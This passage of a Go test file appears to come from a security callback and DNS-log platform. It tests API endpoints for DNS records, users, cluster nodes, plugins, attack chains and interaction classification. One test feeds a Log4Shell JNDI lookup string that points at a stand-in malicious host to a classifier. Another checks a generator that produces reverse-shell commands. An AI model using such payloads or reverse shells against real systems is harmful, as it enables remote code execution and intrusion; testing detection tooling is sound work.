			t.Errorf("Expected delivery_count 3, got %d", resp.Data.Summary.DeliveryCount)
		}
		if resp.Data.Summary.AuditCount != 1 {
			t.Errorf("Expected audit_count 1, got %d", resp.Data.Summary.AuditCount)
		}
		if resp.Data.Summary.Delivered != 1 {
			t.Errorf("Expected delivered 1, got %d", resp.Data.Summary.Delivered)
		}
		if resp.Data.Summary.Failed != 1 {
			t.Errorf("Expected failed 1, got %d", resp.Data.Summary.Failed)
		}
		if resp.Data.Summary.Timeout != 1 {
			t.Errorf("Expected timeout 1, got %d", resp.Data.Summary.Timeout)
		}

		// Verify export trace
		if len(resp.Data.Exports) != 1 {
			t.Errorf("Expected 1 export, got %d", len(resp.Data.Exports))
		}
		export := resp.Data.Exports[0]
		if export.AgentRunID != agentRunID {
			t.Errorf("Expected agent_run_id %s, got %s", agentRunID, export.AgentRunID)
		}
		if export.OperationID != exportOpID {
			t.Errorf("Expected operation_id %s, got %s", exportOpID, export.OperationID)
		}

		// Verify delivery trace
		if len(resp.Data.Deliveries) != 3 {
			t.Errorf("Expected 3 deliveries, got %d", len(resp.Data.Deliveries))
		}
		delivery := resp.Data.Deliveries[0]
		if delivery.AgentRunID != agentRunID {
			t.Errorf("Expected agent_run_id %s, got %s", agentRunID, delivery.AgentRunID)
		}
		if delivery.Result != "delivered" {
			t.Errorf("Expected result delivered, got %s", delivery.Result)
		}

		// Verify sanitization - webhook URL should not be exposed
		if delivery.DestinationHost == "https://hooks.example.com/webhook" {
			t.Errorf("Webhook URL should be sanitized, but got full URL")
		}
		if delivery.StatusCode == 200 {
			// Status code is allowed as it's not sensitive
		}

		// Verify audit trace
		if len(resp.Data.Audits) != 1 {
			t.Errorf("Expected 1 audit, got %d", len(resp.Data.Audits))
		}
		audit := resp.Data.Audits[0]
		if audit.Action != "agent_run.review_exported" {
			t.Errorf("Expected action agent_run.review_exported, got %s", audit.Action)
		}
	})

	// Test route order - ensure review-package-trace is not captured by /:id
	t.Run("route order", func(t *testing.T) {
		// Test that a request to review-package-trace doesn't get captured by /:id
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/review-package-trace?package_hash="+validHash, nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Expected 200 for trace endpoint, got %d", w.Code)
		}

		var resp struct {
			Code int `json:"code"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("Failed to unmarshal response: %v", err)
		}

		if resp.Code != 0 {
			t.Errorf("Expected code 0 for trace endpoint, got %d", resp.Code)
		}
	})
}

// --- V2 DNS Records CRUD Tests ---

func setupV2DNSTest(t *testing.T) (*WebServer, *gin.Engine, string) {
	t.Helper()

	cfg := &WebServerConfig{
		Domain:          "test.example.com",
		Driver:          "sqlite",
		Dsn:             ":memory:",
		AuthExpire:      3600,
		DefaultLanguage: "en-US",
	}
	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("failed to create server: %v", err)
	}
	if err := server.initDatabase(); err != nil {
		t.Fatalf("failed to initialize database: %v", err)
	}
	if err := server.orm.Sync2(new(models.TblResolve)); err != nil {
		t.Fatalf("failed to sync TblResolve: %v", err)
	}

	hashedPassword, _ := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	user := &models.TblUser{
		Name:    "dnsadmin",
		Email:   "dnsadmin@test.com",
		Pass:    string(hashedPassword),
		Role:    0,
		Lang:    "en-US",
		Token:   "test-token-dns",
		ShortId: "testshortid1",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("failed to create user: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"dnsadmin","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)
	if loginW.Code != http.StatusOK {
		t.Fatalf("login failed with status %d: %s", loginW.Code, loginW.Body.String())
	}
	var loginResp struct {
		Data struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	json.Unmarshal(loginW.Body.Bytes(), &loginResp)

	parts := strings.Split(loginResp.Data.Token, ".")
	decoded, _ := base64.RawURLEncoding.DecodeString(parts[1])
	var claims map[string]interface{}
	json.Unmarshal(decoded, &claims)
	seed, _ := claims["seed"].(string)
	store.Set(fmt.Sprintf("%v.seed", user.Id), seed, cache.NoExpiration)
	store.Set(fmt.Sprintf("%v.user", user.Id), user, cache.NoExpiration)

	return server, r, loginResp.Data.Token
}

func TestV2DNSRecordsCRUD(t *testing.T) {
	_, r, token := setupV2DNSTest(t)
	authHeader := "Bearer " + token

	// Create
	createBody := `{"host":"www","type":"A","value":"192.168.1.1","ttl":300}`
	req := httptest.NewRequest("POST", "/api/v2/dns/records", strings.NewReader(createBody))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", authHeader)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("create failed: %d %s", w.Code, w.Body.String())
	}
	var createResp struct {
		Code int                    `json:"code"`
		Data map[string]interface{} `json:"data"`
	}
	json.Unmarshal(w.Body.Bytes(), &createResp)
	if createResp.Code != 0 {
		t.Fatalf("create failed: code=%d", createResp.Code)
	}
	recordID, _ := createResp.Data["id"].(string)
	if recordID == "" {
		t.Fatal("expected record id")
	}

	// List
	req = httptest.NewRequest("GET", "/api/v2/dns/records", nil)
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("list failed: %d", w.Code)
	}
	var listResp struct {
		Code int `json:"code"`
		Data struct {
			Items []map[string]interface{} `json:"items"`
			Total int                      `json:"total"`
		} `json:"data"`
	}
	json.Unmarshal(w.Body.Bytes(), &listResp)
	if listResp.Code != 0 {
		t.Fatalf("list failed: code=%d", listResp.Code)
	}
	if listResp.Data.Total < 1 {
		t.Fatalf("expected at least 1 record, got %d", listResp.Data.Total)
	}

	// Update
	updateBody := `{"value":"10.0.0.1"}`
	req = httptest.NewRequest("PUT", "/api/v2/dns/records/"+recordID, strings.NewReader(updateBody))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("update failed: %d %s", w.Code, w.Body.String())
	}

	// Verify update via list
	req = httptest.NewRequest("GET", "/api/v2/dns/records", nil)
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	json.Unmarshal(w.Body.Bytes(), &listResp)
	found := false
	for _, item := range listResp.Data.Items {
		if item["id"] == recordID && item["value"] == "10.0.0.1" {
			found = true
		}
	}
	if !found {
		t.Fatal("updated record not found or value not updated")
	}

	// Delete
	req = httptest.NewRequest("DELETE", "/api/v2/dns/records/"+recordID, nil)
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("delete failed: %d", w.Code)
	}

	// Verify deleted via list
	req = httptest.NewRequest("GET", "/api/v2/dns/records", nil)
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	json.Unmarshal(w.Body.Bytes(), &listResp)
	for _, item := range listResp.Data.Items {
		if item["id"] == recordID {
			t.Fatal("record should have been deleted")
		}
	}

	// Update non-existent → 404
	req = httptest.NewRequest("PUT", "/api/v2/dns/records/99999", strings.NewReader(`{"value":"1.2.3.4"}`))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404 for non-existent record, got %d", w.Code)
	}
}

func TestV2QueryXip(t *testing.T) {
	_, r, token := setupV2DNSTest(t)
	authHeader := "Bearer " + token

	// Valid IPv4
	req := httptest.NewRequest("GET", "/api/v2/dns/xip/192.168.1.1", nil)
	req.Header.Set("Authorization", authHeader)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("xip query failed: %d %s", w.Code, w.Body.String())
	}
	var resp struct {
		Code int `json:"code"`
		Data struct {
			Dotted   string            `json:"dotted"`
			Hex      string            `json:"hex"`
			Binary   string            `json:"binary"`
			Examples map[string]string `json:"examples"`
		} `json:"data"`
	}
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp.Code != 0 {
		t.Fatalf("xip query failed: code=%d", resp.Code)
	}
	if resp.Data.Dotted != "192.168.1.1" {
		t.Errorf("expected dotted=192.168.1.1, got %s", resp.Data.Dotted)
	}
	if resp.Data.Hex != "c0a80101" {
		t.Errorf("expected hex=c0a80101, got %s", resp.Data.Hex)
	}
	if resp.Data.Binary != "0b11000000101010000000000100000001" {
		t.Errorf("expected binary=0b11000000101010000000000100000001, got %s", resp.Data.Binary)
	}
	if resp.Data.Examples["dotted_decimal"] != "192.168.1.1.example.com" {
		t.Errorf("unexpected dotted_decimal example: %s", resp.Data.Examples["dotted_decimal"])
	}

	// Invalid IP
	req = httptest.NewRequest("GET", "/api/v2/dns/xip/notanip", nil)
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for invalid IP, got %d", w.Code)
	}

	// IPv6 → 400
	req = httptest.NewRequest("GET", "/api/v2/dns/xip/::1", nil)
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for IPv6, got %d", w.Code)
	}
}

func TestV2UserManagement(t *testing.T) {
	_, r, token := setupV2DNSTest(t)
	authHeader := "Bearer " + token

	// Create user
	createBody := `{"username":"newuser","email":"new@test.com","password":"StrongPass123!","role":1}`
	req := httptest.NewRequest("POST", "/api/v2/users", strings.NewReader(createBody))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", authHeader)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("create user failed: %d %s", w.Code, w.Body.String())
	}
	var createResp struct {
		Code int                    `json:"code"`
		Data map[string]interface{} `json:"data"`
	}
	json.Unmarshal(w.Body.Bytes(), &createResp)
	if createResp.Code != 0 {
		t.Fatalf("create user failed: code=%d", createResp.Code)
	}
	userID, _ := createResp.Data["id"].(string)
	if userID == "" {
		t.Fatal("expected user id")
	}

	// List users → at least 2
	req = httptest.NewRequest("GET", "/api/v2/users", nil)
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	var listResp struct {
		Code int `json:"code"`
		Data struct {
			Items []map[string]interface{} `json:"items"`
			Total int                      `json:"total"`
		} `json:"data"`
	}
	json.Unmarshal(w.Body.Bytes(), &listResp)
	if listResp.Data.Total < 2 {
		t.Fatalf("expected at least 2 users, got %d", listResp.Data.Total)
	}

	// Update user role
	updateBody := `{"role":2}`
	req = httptest.NewRequest("PUT", "/api/v2/users/"+userID, strings.NewReader(updateBody))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("update user failed: %d %s", w.Code, w.Body.String())
	}

	// Update user password
	updateBody = `{"password":"NewStrongPass456!"}`
	req = httptest.NewRequest("PUT", "/api/v2/users/"+userID, strings.NewReader(updateBody))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("update password failed: %d %s", w.Code, w.Body.String())
	}

	// Delete user
	req = httptest.NewRequest("DELETE", "/api/v2/users/"+userID, nil)
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("delete user failed: %d %s", w.Code, w.Body.String())
	}

	// Delete super user → 403
	// The admin user (role=0) is the first user with id=1
	req = httptest.NewRequest("DELETE", "/api/v2/users/1", nil)
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusForbidden {
		t.Errorf("expected 403 for deleting super user, got %d", w.Code)
	}

	// Create with weak password → 400
	createBody = `{"username":"weakuser","email":"weak@test.com","password":"short","role":1}`
	req = httptest.NewRequest("POST", "/api/v2/users", strings.NewReader(createBody))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for weak password, got %d", w.Code)
	}

	// Create with duplicate username → 409
	createBody = `{"username":"dnsadmin","email":"dup@test.com","password":"StrongPass123!","role":1}`
	req = httptest.NewRequest("POST", "/api/v2/users", strings.NewReader(createBody))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", authHeader)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusConflict {
		t.Errorf("expected 409 for duplicate username, got %d", w.Code)
	}
}

// --- HA Cluster Integration Tests ---

func TestV2HAClusterListNodes(t *testing.T) {
	gin.SetMode(gin.TestMode)

	_, r, token := setupV2ScannerHubAPITest(t)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/cluster/nodes", nil)
	req.Header.Set("Access-Token", token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp struct {
		Code int `json:"code"`
		Data struct {
			Items []interface{} `json:"items"`
			Total int           `json:"total"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if resp.Code != 0 {
		t.Fatalf("expected code 0, got %d", resp.Code)
	}
}

func TestV2HAClusterCreateAndGetNode(t *testing.T) {
	gin.SetMode(gin.TestMode)

	_, r, token := setupV2ScannerHubAPITest(t)

	// Create a node
	body := strings.NewReader(`{"id":"test-node-1","name":"test-node","host":"127.0.0.1","port":8080,"role":"primary","is_enabled":true}`)
	req := httptest.NewRequest(http.MethodPost, "/api/v2/cluster/nodes", body)
	req.Header.Set("Access-Token", token)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var createResp struct {
		Code int `json:"code"`
		Data struct {
			ID   string `json:"id"`
			Name string `json:"name"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &createResp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if createResp.Data.ID != "test-node-1" {
		t.Fatalf("expected node ID 'test-node-1', got '%s'", createResp.Data.ID)
	}

	// Get the node
	req = httptest.NewRequest(http.MethodGet, "/api/v2/cluster/nodes/test-node-1", nil)
	req.Header.Set("Access-Token", token)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var getResp struct {
		Code int `json:"code"`
		Data struct {
			ID     string `json:"id"`
			Status string `json:"status"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &getResp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if getResp.Data.ID != "test-node-1" {
		t.Fatalf("expected node ID 'test-node-1', got '%s'", getResp.Data.ID)
	}
}

func TestV2HAClusterGetConfig(t *testing.T) {
	gin.SetMode(gin.TestMode)

	_, r, token := setupV2ScannerHubAPITest(t)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/cluster/config", nil)
	req.Header.Set("Access-Token", token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp struct {
		Code int `json:"code"`
		Data struct {
			ID               string `json:"id"`
			EnableFailover   bool   `json:"enable_failover"`
			BalanceAlgorithm string `json:"balance_algorithm"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if resp.Code != 0 {
		t.Fatalf("expected code 0, got %d", resp.Code)
	}
}

func TestV2HealthCheck(t *testing.T) {
	gin.SetMode(gin.TestMode)

	_, r, _ := setupV2ScannerHubAPITest(t)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/health", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if resp.Code != 0 {
		t.Fatalf("expected code 0, got %d", resp.Code)
	}
	if resp.Message != "ok" {
		t.Fatalf("expected message 'ok', got '%s'", resp.Message)
	}
}

// --- Marketplace Install Integration Tests ---

func TestV2MarketplaceInstallAndList(t *testing.T) {
	gin.SetMode(gin.TestMode)

	server, r, token := setupV2ScannerHubAPITest(t)

	// Sync marketplace schema
	if err := server.orm.Sync2(new(marketplace.Plugin), new(marketplace.PluginInstallation)); err != nil {
		t.Fatalf("failed to sync marketplace schema: %v", err)
	}

	// First, create a plugin via the API (using create endpoint if available)
	// Since there's no create endpoint in routes, insert directly
	plugin := &marketplace.Plugin{
		ID:          "test-plugin-1",
		Name:        "Test Plugin",
		Description: "A test plugin",
		Version:     "1.0.0",
		Author:      "test",
		Downloads:   0,
		Rating:      5,
		IsPublished: true,
	}
	if _, err := server.orm.Insert(plugin); err != nil {
		t.Fatalf("failed to create test plugin: %v", err)
	}

	// Install the plugin
	body := strings.NewReader(`{"version":"1.0.0"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/v2/marketplace/plugins/test-plugin-1/install", body)
	req.Header.Set("Access-Token", token)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var installResp struct {
		Code int `json:"code"`
		Data struct {
			ID       string `json:"id"`
			PluginID string `json:"plugin_id"`
			Status   string `json:"status"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &installResp); err != nil {
		t.Fatalf("failed to parse install response: %v", err)
	}
	if installResp.Code != 0 {
		t.Fatalf("expected code 0, got %d", installResp.Code)
	}
	if installResp.Data.PluginID != "test-plugin-1" {
		t.Fatalf("expected plugin_id 'test-plugin-1', got '%s'", installResp.Data.PluginID)
	}
	if installResp.Data.Status != "installed" {
		t.Fatalf("expected status 'installed', got '%s'", installResp.Data.Status)
	}

	// List installed plugins
	req = httptest.NewRequest(http.MethodGet, "/api/v2/marketplace/installed", nil)
	req.Header.Set("Access-Token", token)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var listResp struct {
		Code int `json:"code"`
		Data struct {
			Items []interface{} `json:"items"`
			Total int           `json:"total"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &listResp); err != nil {
		t.Fatalf("failed to parse list response: %v", err)
	}
	if listResp.Code != 0 {
		t.Fatalf("expected code 0, got %d", listResp.Code)
	}
	if listResp.Data.Total < 1 {
		t.Fatalf("expected at least 1 installed plugin, got %d", listResp.Data.Total)
	}
}

func TestV2AttackChainsEmpty(t *testing.T) {
	gin.SetMode(gin.TestMode)
	_, r, token := setupV2ScannerHubAPITest(t)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/attack-chains", nil)
	req.Header.Set("Access-Token", token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp struct {
		Code int `json:"code"`
		Data struct {
			Items      []interface{} `json:"items"`
			Total      int64         `json:"total"`
			Page       int           `json:"page"`
			PageSize   int           `json:"page_size"`
			TotalPages int           `json:"total_pages"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if resp.Data.Total != 0 {
		t.Errorf("expected total 0, got %d", resp.Data.Total)
	}
	if len(resp.Data.Items) != 0 {
		t.Errorf("expected 0 items, got %d", len(resp.Data.Items))
	}
}

func TestV2AttackChainDetailNotFound(t *testing.T) {
	gin.SetMode(gin.TestMode)
	_, r, token := setupV2ScannerHubAPITest(t)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/attack-chains/nonexistent-token", nil)
	req.Header.Set("Access-Token", token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d: %s", w.Code, w.Body.String())
	}
}

func TestV2AttackChainsRequireAuth(t *testing.T) {
	gin.SetMode(gin.TestMode)
	_, r, _ := setupV2ScannerHubAPITest(t)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/attack-chains", nil)
	// No auth header
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401 without auth, got %d", w.Code)
	}
}

func TestV2CreateInteractionWithEnrichment(t *testing.T) {
	gin.SetMode(gin.TestMode)
	srv, _, _ := setupV2ScannerHubAPITest(t)

	// Directly insert an interaction with base64-encoded data via the service
	tokenStr := "test-enrich-token"
	encodedBody := "eyJhZG1pbiI6InRydWUifQ==" // base64 of {"admin":"true"}

	// Create interaction via the service (simulating what happens when a listener receives a request)
	iaSvc := interaction.NewService(srv.orm, nil)
	now := time.Now()
	interaction := &v2models.Interaction{
		ID:        "enrich-test-1",
		Type:      "http",
		Token:     &tokenStr,
		Timestamp: now,
		SourceIP:  "10.0.0.1",
		Body:      &encodedBody,
	}
	if err := iaSvc.CreateInteraction(interaction); err != nil {
		t.Fatalf("failed to create interaction: %v", err)
	}

	// Verify enrichment fields are set
	if interaction.DecodedData == nil {
		t.Error("expected DecodedData to be set after enrichment")
	} else if *interaction.DecodedData != `{"admin":"true"}` {
		t.Errorf("expected decoded data '{\"admin\":\"true\"}', got %q", *interaction.DecodedData)
	}
	if interaction.Encoding == nil || *interaction.Encoding != "base64" {
		t.Errorf("expected encoding 'base64', got %v", interaction.Encoding)
	}
}

func TestV2CreateInteractionWithClassification(t *testing.T) {
	gin.SetMode(gin.TestMode)
	srv, _, _ := setupV2ScannerHubAPITest(t)

	iaSvc := interaction.NewService(srv.orm, nil)
	now := time.Now()
	tokenStr := "test-classify-token"
	domain := "${jndi:ldap://evil.test123.dnslog.fun}"

	interaction := &v2models.Interaction{
		ID:        "classify-test-1",
		Type:      "dns",
		Token:     &tokenStr,
		Timestamp: now,
		SourceIP:  "10.0.0.2",
		Domain:    &domain,
	}
	if err := iaSvc.CreateInteraction(interaction); err != nil {
		t.Fatalf("failed to create interaction: %v", err)
	}

	if interaction.ExploitType == nil {
		t.Fatal("expected ExploitType to be set by classifier")
	}
	if *interaction.ExploitType != "log4shell" {
		t.Errorf("expected exploit_type 'log4shell', got %q", *interaction.ExploitType)
	}
	if interaction.Confidence == nil || *interaction.Confidence != "high" {
		t.Errorf("expected confidence 'high', got %v", interaction.Confidence)
	}
}

func TestV2ReverseShellGenerate(t *testing.T) {
	// This tests the shellgen package directly (unit-level)
	cmds := payload.GenerateShell("192.168.1.1", "4444")
	if len(cmds) != 8 {
		t.Fatalf("expected 8 commands, got %d", len(cmds))
	}
	for _, cmd := range cmds {
		if !strings.Contains(cmd.Command, "192.168.1.1") {
			t.Errorf("%s: missing IP in command", cmd.Name)
		}
		if !strings.Contains(cmd.Command, "4444") {
			t.Errorf("%s: missing port in command", cmd.Name)
		}
	}
}
